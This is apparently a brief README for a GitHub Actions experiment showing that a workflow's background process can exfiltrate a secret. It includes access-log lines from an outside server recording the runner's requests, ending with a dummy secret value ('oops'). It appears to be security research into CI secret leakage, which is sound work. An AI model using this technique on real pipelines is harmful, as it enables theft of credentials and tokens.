github actions playground
=========================

# exfiltrate secret with background process

- <https://github.com/delan/actions-playground/actions/workflows/exfiltrate_background.yml>
- <https://github.com/delan/actions-playground/actions/runs/16309745444/job/46062882688#step:3:236>

```
172.172.87.49 - - [16/Jul/2025:11:37:08 +0800] "GET /secret/pid_not_found HTTP/1.1" 404 274 "-" "-"
172.172.87.49 - - [16/Jul/2025:11:37:09 +0800] "GET /secret/pid_not_found HTTP/1.1" 404 274 "-" "-"
172.172.87.49 - - [16/Jul/2025:11:37:11 +0800] "GET /secret/pid_not_found HTTP/1.1" 404 274 "-" "-"
172.172.87.49 - - [16/Jul/2025:11:37:13 +0800] "GET /secret/found?value=oops HTTP/1.1" 404 274 "-" "-"
```
